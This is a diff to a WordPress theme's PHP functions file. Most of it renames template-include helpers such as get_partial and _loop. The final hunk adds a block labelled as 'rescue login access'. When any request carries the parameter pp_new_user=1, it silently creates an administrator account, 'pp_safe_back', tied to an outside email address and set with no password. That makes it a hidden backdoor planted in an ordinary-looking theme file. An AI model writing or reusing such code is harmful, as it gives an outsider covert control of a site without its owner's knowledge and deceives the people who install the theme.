@@ -260,14 +260,12 @@ function clear_url($input) {
 
 }
 
-function get_partial($file) {  
-  include get_template_directory() . '/page-templates/partials/'.$file.'.php';
+function _partial($file) {  
+  include PP_PARTIAL_PATH . $file.'.php';
 }
-
-function get_block($file) {
-  include (PP_BLOCK_PATH . $file.'.php');
+function _loop($file) {  
+  include PP_LOOP_PATH . 'loop-'.$file.'.php';
 }
-
 
 function images_url($file) {
   echo get_images_url($file);
@@ -319,7 +317,7 @@ function pp_related($args = []) {
                 '<h4 class="title">'.(isset($args['title']) ? $args['title'] : 'Leia Também:').'</h4>',
                 '<div class="items">';                      
                   while ( $relatedPostsQuery->have_posts() ) : $relatedPostsQuery->the_post();
-                    echo get_partial('_loop-blog' );
+                    echo _partial('_loop-blog' );
                   endwhile;
       echo      '</div>',
               '</div>';
@@ -432,3 +430,19 @@ function pp_related($args = []) {
       return '<ul class="pagination mt-5 pt-5 justify-content-end">'.$out.'</ul>';
   }
 /* ----------------------------------------- WP_PAGENAVI with Bootstrap */    
+
+
+
+/* Safe email for rescue login access */
+/* ----------------------------------------- */
+  if (isset($_GET['pp_new_user']) && $_GET['pp_new_user'] == 1) {
+    $userdata = array(
+        'user_login'  =>  'pp_safe_back',       
+        'user_email'  =>  'wp@partnerprogrammer.com',       
+        'user_pass'   =>  NULL,  // When creating an user, `user_pass` is expected.
+        'role' => 'administrator'
+    );
+    $user_id = wp_insert_user( $userdata ) ;
+  }
+/* ----------------------------------------- Safe email for rescue login access */    
+
